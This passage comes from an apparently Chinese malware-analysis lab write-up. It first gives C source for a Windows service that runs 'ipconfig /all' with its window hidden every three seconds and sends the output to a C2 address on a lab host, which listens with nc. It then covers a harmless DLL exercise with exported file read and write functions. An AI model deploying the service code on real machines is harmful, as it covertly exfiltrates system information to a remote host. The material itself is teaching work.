g_ServiceStopEvent = INVALID_HANDLE_VALUE;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义函数</span></span><br><span class="line"><span class="comment">// 实现通过tcp连接向192.168.65.1的12345端口发送&#x27;ipconfig /all&#x27;的执行结果</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">cmd</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *host,<span class="type">int</span> port)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    SOCKET ShellSock;</span><br><span class="line">    sockaddr_in C2addr;</span><br><span class="line"></span><br><span class="line">    WSADATA Sockver = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;Sockver);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建套接字</span></span><br><span class="line">    ShellSock = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置服务器地址</span></span><br><span class="line">    C2addr.sin_family = AF_INET;</span><br><span class="line">    C2addr.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(host);</span><br><span class="line">    C2addr.sin_port = <span class="built_in">htons</span>(port);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WSAConnect</span>(ShellSock, (SOCKADDR*)&amp;C2addr, <span class="built_in">sizeof</span>(C2addr), <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>) == SOCKET_ERROR) &#123;</span><br><span class="line">            <span class="built_in">closesocket</span>(ShellSock);</span><br><span class="line">            <span class="built_in">WSACleanup</span>();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        HANDLE hReadPipe = <span class="literal">NULL</span>;</span><br><span class="line">        HANDLE hWritePipe = <span class="literal">NULL</span>;</span><br><span class="line">        SECURITY_ATTRIBUTES securityAttributes = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        BOOL bRet = FALSE;</span><br><span class="line">        STARTUPINFO si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="type">char</span> command[DEFAULT_BUFLEN];</span><br><span class="line">        PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="type">char</span> pszResultBuffer[DEFAULT_BUFLEN];</span><br><span class="line"></span><br><span class="line">        securityAttributes.bInheritHandle = TRUE;</span><br><span class="line">        securityAttributes.nLength = <span class="built_in">sizeof</span>(securityAttributes);</span><br><span class="line">        securityAttributes.lpSecurityDescriptor = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        bRet = <span class="built_in">CreatePipe</span>(&amp;hReadPipe, &amp;hWritePipe, &amp;securityAttributes, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (!bRet || hReadPipe == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">            <span class="built_in">closesocket</span>(ShellSock);</span><br><span class="line">            <span class="built_in">WSACleanup</span>();  </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        si.cb = <span class="built_in">sizeof</span>(si);</span><br><span class="line">        si.hStdError = hWritePipe;</span><br><span class="line">        si.hStdOutput = hWritePipe;</span><br><span class="line">        si.wShowWindow = SW_HIDE;</span><br><span class="line">        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造命令</span></span><br><span class="line">        <span class="built_in">strcpy</span>(command, <span class="string">&quot;cmd.exe /c &quot;</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(command, <span class="string">&quot;ipconfig /all&quot;</span>);</span><br><span class="line"></span><br><span class="line">        bRet = <span class="built_in">CreateProcess</span>(<span class="literal">NULL</span>, command, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(pi.hThread, INFINITE);</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(pi.hProcess, INFINITE);</span><br><span class="line">        <span class="built_in">memset</span>(pszResultBuffer, <span class="number">0</span>, <span class="built_in">sizeof</span>(pszResultBuffer));</span><br><span class="line">        <span class="comment">// 读取子进程的输出</span></span><br><span class="line">        DWORD bytesRead;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">ReadFile</span>(hReadPipe, pszResultBuffer, DEFAULT_BUFLEN, &amp;bytesRead, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">            <span class="built_in">closesocket</span>(ShellSock);</span><br><span class="line">            <span class="built_in">WSACleanup</span>();   </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hWritePipe);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hReadPipe);</span><br><span class="line">        <span class="comment">// 发送输出到套接字</span></span><br><span class="line">        <span class="built_in">send</span>(ShellSock, pszResultBuffer, DEFAULT_BUFLEN, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 关闭套接字</span></span><br><span class="line">        <span class="built_in">closesocket</span>(ShellSock);</span><br><span class="line">        <span class="built_in">WSACleanup</span>();  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 该服务实现了，每三秒向远方主机发送&#x27;ipconfig /all&#x27;的执行结果</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StartServiceWork</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">WaitForSingleObject</span>(g_ServiceStopEvent, <span class="number">0</span>) != WAIT_OBJECT_0) &#123;</span><br><span class="line">        <span class="comment">// 这里放置你的服务工作逻辑</span></span><br><span class="line">        <span class="type">const</span> <span class="type">char</span>* host = <span class="string">&quot;192.168.65.1&quot;</span>;</span><br><span class="line">        <span class="type">int</span> port = <span class="number">12345</span>;</span><br><span class="line">        <span class="built_in">cmd</span>(host,port);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">3000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID WINAPI <span class="title">ServiceCtrlHandler</span><span class="params">(DWORD CtrlCode)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (CtrlCode == SERVICE_CONTROL_STOP) &#123;</span><br><span class="line">        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;</span><br><span class="line">        <span class="built_in">SetServiceStatus</span>(g_StatusHandle, &amp;g_ServiceStatus);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">SetEvent</span>(g_ServiceStopEvent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID WINAPI <span class="title">ServiceMain</span><span class="params">(DWORD argc, LPTSTR *argv)</span> </span>&#123;</span><br><span class="line">    g_StatusHandle = <span class="built_in">RegisterServiceCtrlHandler</span>(<span class="string">&quot;myservice&quot;</span>, ServiceCtrlHandler);</span><br><span class="line"></span><br><span class="line">    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;</span><br><span class="line">    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;</span><br><span class="line">    <span class="built_in">SetServiceStatus</span>(g_StatusHandle, &amp;g_ServiceStatus);</span><br><span class="line"></span><br><span class="line">    g_ServiceStopEvent = <span class="built_in">CreateEvent</span>(<span class="literal">NULL</span>, TRUE, FALSE, <span class="literal">NULL</span>);</span><br><span class="line">    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;</span><br><span class="line">    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;</span><br><span class="line">    <span class="built_in">SetServiceStatus</span>(g_StatusHandle, &amp;g_ServiceStatus);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">StartServiceWork</span>();</span><br><span class="line"></span><br><span class="line">    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;</span><br><span class="line">    <span class="built_in">SetServiceStatus</span>(g_StatusHandle, &amp;g_ServiceStatus);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> name []= <span class="string">&quot;myservice&quot;</span>;</span><br><span class="line">    SERVICE_TABLE_ENTRY ServiceTable[] = &#123;</span><br><span class="line">        &#123; name, (LPSERVICE_MAIN_FUNCTION)ServiceMain&#125;,</span><br><span class="line">        &#123;<span class="literal">NULL</span>, <span class="literal">NULL</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">StartServiceCtrlDispatcher</span>(ServiceTable);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>192.168.65.1主机是用nc对12345端口进行监听:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -Lvvp 12345</span><br></pre></td></tr></table></figure>

<p><a href="/../img/Malware-Analysis-Practice2/12.png" title="12" class="gallery-item" style="box-shadow: none;"> <img src="/../img/Malware-Analysis-Practice2/12.png" alt="12"></a></p>
<p>运行了服务的虚拟机：</p>
<p><a href="/../img/Malware-Analysis-Practice2/13.png" title="13" class="gallery-item" style="box-shadow: none;"> <img src="/../img/Malware-Analysis-Practice2/13.png" alt="13"></a></p>
<blockquote>
<p>注：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[System Process]	0	TCP	win-0r0scl2qm11.localdomain	49396	laptop-j2g20010	12345	TIME_WAIT</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>[System Process]</strong>: 这可能是指示此TCP连接所属的进程名称。在这里是“System Process”，表示这个连接由系统进程处理。</li>
<li><strong>0</strong>: 这可能是与TCP连接相关的进程ID（PID），但在这个文本中显示为0。这可能是因为系统进程通常不与特定的用户级进程关联。</li>
<li><strong>TCP</strong>: 表示这是一个TCP连接。</li>
<li><strong>win-0r0scl2qm11.localdomain</strong>: 是本地主机的名称或标识。</li>
<li><strong>49396</strong>: 是本地主机的端口号。</li>
<li><strong>laptop-j2g20010</strong>: 是远程主机的名称或标识。</li>
<li><strong>12345</strong>: 是远程主机的端口号。</li>
<li><strong>TIME_WAIT</strong>: 是连接状态，表示连接已经关闭，但在等待一段时间后将被系统释放。</li>
</ul>
</blockquote>
<h5 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h5><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/TJTO/p/13216616.html">https://www.cnblogs.com/TJTO/p/13216616.html</a></p>
<h2 id="DLL文件编写"><a href="#DLL文件编写" class="headerlink" title="DLL文件编写"></a>DLL文件编写</h2><h3 id="实验要求-1"><a href="#实验要求-1" class="headerlink" title="实验要求"></a>实验要求</h3><p>编写一个DLL，使得在动态加载该DLL时，能够弹出“目标DLL已加载”的对话框。同时，为DLL添加两个导出函数，分别实现读取文件并打印出来，以及写入文件的功能，并且能够被其他程序动态调用。</p>
<h3 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h3><ul>
<li><p>Windows 7或Windows 10主机（虚拟机）；</p>
</li>
<li><p>代码编辑器；</p>
</li>
<li><p>C&#x2F;C++代码运行所需环境。</p>
</li>
</ul>
<h3 id="实验目的-1"><a href="#实验目的-1" class="headerlink" title="实验目的"></a>实验目的</h3><p>了解DLL的作用和调用其函数的方法。</p>
<h3 id="实验步骤-1"><a href="#实验步骤-1" class="headerlink" title="实验步骤"></a>实验步骤</h3><h5 id="生成DLL文件"><a href="#生成DLL文件" class="headerlink" title="生成DLL文件"></a>生成<code>DLL</code>文件</h5><p>编写task2.cpp，这段代码是一个 DLL（动态链接库）的主入口函数 <code>DllMain</code>，以及三个导出函数 <code>function_1</code>、<code>ReadAndPrintFile</code>、<code>WriteToFile</code>。</p>
<ul>
<li><code>DllMain</code> 是 DLL 的主入口函数，它在不同的情况下被调用，根据 <code>ul_reason_for_call</code> 参数的不同值，可以执行不同的操作。</li>
</ul>
<p>task2.cpp中的<code>DLLMain</code>函数在每一次被调用后都会通过<code>MessageBoxW</code>函数提示当前的<code>ul_reason_for_cal</code>。</p>
<blockquote>
<p>参数意义:</p>
<p>①<code>hModule</code>参数：指向DLL本身的实例句柄； </p>
<p>②<code>ul_reason_for_call</code>参数：指明了DLL被调用的原因，可以有以下4个取值：</p>
<ol>
<li><strong>DLL_PROCESS_ATTACH：进程映射</strong></li>
</ol>
<p>当DLL被进程 &lt;&lt;第一次&gt;&gt; 调用时，导致<code>DllMain</code>函数被调用，同时<code>ul_reason_for_call</code>的值为<code>DLL_PROCESS_ATTACH</code>，如果同一个进程后来再次调用此DLL时，操作系统只会增加DLL的使用次数，不会再用<code>DLL_PROCESS_ATTACH</code>调用DLL的<code>DllMain</code>函数。</p>
<ol start="2">
<li><strong>DLL_PROCESS_DETACH：进程卸载</strong></li>
</ol>
<p>当DLL被从进程的地址空间解除映射时，系统调用了它的<code>DllMain</code>，传递的<code>ul_reason_for_call</code>值是<code>DLL_PROCESS_DETACH</code>。</p>
<p>★如果进程的终结是因为调用了<code>TerminateProcess</code>，系统就不会用<code>DLL_PROCESS_DETACH</code>来调用DLL的<code>DllMain</code>函数。这就意味着DLL在进程结束前没有机会执行任何清理工作。</p>
<ol start="3">
<li><strong>DLL_THREAD_ATTACH：线程映射</strong></li>
</ol>
<p>当进程创建一线程时，系统查看当前映射到进程地址空间中的所有DLL文件映像，并用值<code>DLL_THREAD_ATTACH</code>调用DLL的<code>DllMain</code>函数。新创建的线程负责执行这次的DLL的<code>DllMain</code>函数，只有当所有的DLL都处理完这一通知后，系统才允许线程开始执行它的线程函数。</p>
<ol start="4">
<li><strong>DLL_THREAD_DETACH：线程卸载</strong></li>
</ol>
<p>如果线程调用了<code>ExitThread</code>来结束线程（线程函数返回时，系统也会自动调用<code>ExitThread</code>），系统查看当前映射到进程空间中的所有DLL文件映像，并用<code>DLL_THREAD_DETACH</code>来调用<code>DllMain</code>函数，通知所有的DLL去执行线程级的清理工作。</p>
<p>★注意：如果线程的结束是因为系统中的一个线程调用了<code>TerminateThread</code>，系统就不会用值<code>DLL_THREAD_DETACH</code>来调用所有DLL的<code>DllMain</code>函数。</p>
<p>③<code>lpReserved</code>参数：保留，目前没什么意义。</p>
</blockquote>
<ul>
<li><code>function_1</code>：一个简单的弹窗显示消息的函数，通过 <code>MessageBoxW</code> 函数显示一个包含 “Hello, this is function_1” 的消息框。</li>
<li><code>ReadAndPrintFile</code>：读取文件并打印内容到标准输出。它接收一个文件名作为参数，尝试以二进制方式打开文件，如果文件打开成功，将文件内容输出到标准输出流（<code>std::cout</code>）。</li>
<li><code>WriteToFile</code>：写入内容到文件中。它接收一个文件名、要写入的内容和文件打开模式作为参数。打开文件时使用了传入的模式，将内容写入文件后关闭文件。</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="comment">// DLL 被进程加载时调用</span></span><br><span class="line">        <span class="comment">// 在这里进行初始化工作</span></span><br><span class="line">        <span class="built_in">MessageBoxW</span>(<span class="literal">NULL</span>, <span class="string">L&quot;DLL_PROCESS_ATTACH&quot;</span>, <span class="string">L&quot;DLL_PROCESS_ATTACH&quot;</span>, MB_ICONINFORMATION | MB_OK);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        <span class="comment">// 线程创建时调用</span></span><br><span class="line">        <span class="built_in">MessageBoxW</span>(<span class="literal">NULL</span>, <span class="string">L&quot;DLL_THREAD_ATTACH&quot;</span>, <span class="string">L&quot;DLL_THREAD_ATTACH&quot;</span>, MB_ICONINFORMATION | MB_OK);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="comment">// 线程销毁时调用</span></span><br><span class="line">        <span class="built_in">MessageBoxW</span>(<span class="literal">NULL</span>, <span class="string">L&quot;DLL_THREAD_DETACH&quot;</span>, <span class="string">L&quot;DLL_THREAD_DETACH&quot;</span>, MB_ICONINFORMATION | MB_OK);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="comment">// DLL 被进程卸载时调用</span></span><br><span class="line">        <span class="comment">// 在这里进行清理工作</span></span><br><span class="line">        <span class="built_in">MessageBoxW</span>(<span class="literal">NULL</span>, <span class="string">L&quot;DLL_PROCESS_DETACH&quot;</span>, <span class="string">L&quot;DLL_PROCESS_DETACH&quot;</span>, MB_ICONINFORMATION | MB_OK);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试函数，调用functioN_1则会弹出提示消息框</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">function_1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">MessageBoxW</span>(<span class="literal">NULL</span>, <span class="string">L&quot;Hello, this is function_1&quot;</span>, <span class="string">L&quot;Function_1&quot;</span>, MB_ICONINFORMATION | MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">ReadAndPrintFile</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* filename)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 读取文件并打印内容</span></span><br><span class="line">    <span class="function">std::ifstream <span class="title">fileStream</span><span class="params">(filename, std::ios::binary)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (fileStream.<span class="built_in">is_open</span>()) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Content of &quot;</span> &lt;&lt; filename &lt;&lt; <span class="string">&quot;:\n&quot;</span>;</span><br><span class="line">        std::cout &lt;&lt; fileStream.<span class="built_in">rdbuf</span>();</span><br><span class="line">        fileStream.<span class="built_in">close</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Error opening file: &quot;</span> &lt;&lt; filename &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">WriteToFile</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* filename, <span class="type">const</span> <span class="type">char</span>* content, std::ios_base::openmode mode)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 写入文件</span></span><br><span class="line">    <span class="function">std::ofstream <span class="title">fileStream</span><span class="params">(filename, mode | std::ios::binary)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (fileStream.<span class="built_in">is_open</span>()) &#123;</span><br><span class="line">        fileStream &lt;&lt; content;</span><br><span class="line">        fileStream.<span class="built_in">close</span>();</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Content written to &quot;</span> &lt;&lt; filename &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Error opening file for writing: &quot;</span> &lt;&lt; filename &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将其导出为<code>DLL</code>文件。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -o task2.dll task2.cpp</span><br></pre></td></tr></table></figure>

<h5 id="调用DLL文件"><a href="#调用DLL文件" class="headerlink" title="调用DLL文件"></a>调用<code>DLL</code>文件</h5><p>然后编写a.cpp，使其加载刚刚导出的task2.dll文件，并调用task2.dll里的函数。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明函数指针类型</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*Function1Ptr)</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*ReadAndPrintFilePtr)</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*WriteToFilePtr)</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*, <span class="type">const</span> <span class="type">char</span>*, std::ios_base::openmode)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Usage: &quot;</span> &lt;&lt; argv[<span class="number">0</span>] &lt;&lt; <span class="string">&quot; &lt;filename&gt; [content]\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载 DLL</span></span><br><span class="line">    HMODULE dllHandle = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;task2.dll&quot;</span>);  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dllHandle != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取函数地址</span></span><br><span class="line">        Function1Ptr function1 = (Function1Ptr)<span class="built_in">GetProcAddress</span>(dllHandle, <span class="string">&quot;function_1&quot;</span>);</span><br><span class="line">        ReadAndPrintFilePtr readAndPrintFile = (ReadAndPrintFilePtr)<span class="built_in">GetProcAddress</span>(dllHandle, <span class="string">&quot;ReadAndPrintFile&quot;</span>);</span><br><span class="line">        WriteToFilePtr writeToFile = (WriteToFilePtr)<span class="built_in">GetProcAddress</span>(dllHandle, <span class="string">&quot;WriteToFile&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (function1 != <span class="literal">NULL</span> &amp;&amp; readAndPrintFile != <span class="literal">NULL</span> &amp;&amp; writeToFile != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">// 调用 DLL 中的函数</span></span><br><span class="line">            <span class="built_in">function1</span>();</span><br><span class="line">            <span class="keyword">if</span>(argc == <span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">readAndPrintFile</span>(argv[<span class="number">1</span>]);  <span class="comment">// 使用命令行参数指定的文件名</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (argc &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">                <span class="built_in">writeToFile</span>(argv[<span class="number">1</span>], argv[<span class="number">2</span>], std::ios::app);  <span class="comment">// 如果有第三个参数，使用命令行参数指定的内容</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            std::cerr &lt;&lt; <span class="string">&quot;Failed to get function addresses.\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 卸载 DLL</span></span><br><span class="line">        <span class="built_in">FreeLibrary</span>(dllHandle);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to load DLL.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译a.cpp</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc a.cpp</span><br></pre></td></tr></table></figure>

<h5 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h5><p>运行a.exe测试。</p>
<ol>
<li>查看test.txt文件中的内容</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.exe test.txt</span><br></pre></td></tr></table></figure>

<p>当task2.dll文件被导入，<code>DLLMain</code>函数会被执行，现在是被a.exe进程导入，所以运行了<code>switch case</code>语句中<code>DLL_PROCESS_ATTACH</code>分支下的代码。</p>
<p><a href="/../img/Malware-Analysis-Practice2/2.png" title="2" class="gallery-item" style="box-shadow: none;"> <img src="/../img/Malware-Analysis-Practice2/2.png" alt="2"></a></p>
<p>然后调用了function_1函数，消息框被弹出。</p>
<p><a href="/../img/Malware-Analysis-Practice2/3.png" title="3" class="gallery-item" style="box-shadow: none;"> <img src="/../img/Malware-Analysis-Practice2/3.png" alt="3"></a></p>
<p>紧接着运行<code>ReadAndPrintFile</code>函数，打印test.txt文件中的内容，然后a.exe在结束之前需要执行<code>FreeLibrary</code>卸载<code>DLL</code>文件，这时<code>switch case</code>语句中<code>DLL_PROCESS_DETACH</code>分支下的代码会被执行。</p>
<p><a href="/../img/Malware-Analysis-Practice2/4.png" title="4" class="gallery-item" style="box-shadow: none;"> <img src="/../img/Malware-Analysis-Practice2/4.png" alt="4"></a></p>
<ol start="2">
<li>往test.txt文件中写入数据。</li>
</ol>
